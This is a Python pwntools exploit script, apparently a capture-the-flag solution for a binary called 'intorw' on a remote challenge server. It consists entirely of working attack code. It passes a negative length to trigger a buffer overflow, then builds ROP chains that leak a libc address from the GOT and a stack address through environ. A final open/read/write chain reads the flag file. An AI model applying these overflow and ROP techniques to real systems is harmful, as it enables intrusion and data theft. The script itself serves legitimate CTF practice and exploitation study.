from pwn import *

# io = process("./intorw")
io = remote("node5.anna.nssctf.cn", 25932)
elf = ELF("./intorw")
libc = ELF("./libc.so.6")

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
vuln_addr = elf.sym["vuln"]

poprdi = 0x400AD3
ret = 0x400726
flag_str = 0x601046

io.recvuntil(b"you want to read")
io.sendline(b"-1")
io.recvuntil(b"you want to read")
io.sendline(
    b"a" * (0x20 + 8) + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)
)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - libc.sym["puts"]
print("libc base address =", hex(libc_base))

environ = libc_base + libc.sym["environ"]
poprsi = libc_base + 0x2BE51
poprdx_rbx = libc_base + 0x090529
open_addr = libc_base + libc.sym["open"]
read_addr = libc_base + libc.sym["read"]
write_addr = libc_base + libc.sym["write"]

io.recvuntil(b"you want to read")
io.sendline(b"-1")
io.recvuntil(b"you want to read")
io.sendline(
    b"a" * (0x20 + 8) + p64(poprdi) + p64(environ) + p64(puts_plt) + p64(vuln_addr)
)
stack_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
print("stack_addr =", hex(stack_addr))
io.recvuntil(b"you want to read")
io.sendline(b"-1")
io.recvuntil(b"you want to read")

# open(flag_str, 0, 0)
payload = (
    p64(poprdi)
    + p64(flag_str)
    + p64(poprsi)
    + p64(0)
    + p64(poprdx_rbx)
    + p64(0)
    + p64(0)
    + p64(open_addr)
)

# read(3, stack_addr, 0x30)
payload += (
    p64(poprdi)
    + p64(3)
    + p64(poprsi)
    + p64(stack_addr)
    + p64(poprdx_rbx)
    + p64(0x30)
    + p64(0)
    + p64(read_addr)
)

# write(1, stack_addr, 0x30)
payload += (
    p64(poprdi)
    + p64(1)
    + p64(poprsi)
    + p64(stack_addr)
    + p64(poprdx_rbx)
    + p64(0x30)
    + p64(0)
    + p64(write_addr)
)
io.sendline(b"a" * (0x20 + 8) + payload)


io.interactive()
